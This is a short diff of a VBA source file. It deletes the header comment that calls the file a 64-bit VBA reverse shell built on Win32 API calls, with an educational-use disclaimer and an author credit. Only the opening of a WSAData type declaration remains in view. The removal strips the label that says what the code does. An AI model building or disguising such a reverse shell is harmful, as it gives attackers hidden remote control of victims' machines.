@@ -1,18 +1,3 @@
-' ********************************************************************************************************
-'
-' 64-bit compatible VBA reverse shell using Win32 API calls.
-' Most of the code was adapted from:
-'
-'   * https://stackoverflow.com/questions/8670391
-'   * https://stackoverflow.com/questions/43197814
-'   * https://renenyffenegger.ch/notes/development/languages/VBA/Win-API/examples/
-'
-' This code demonstrates calling Win32 API functions from VBA for educational purposes only.
-'
-' Author: Tobias Neitzel (@qtc_de) - Adapted for 64-bit compatibility.
-'
-' ********************************************************************************************************
-
 Private Type WSAData
    wVersion As Integer
    wHighVersion As Integer
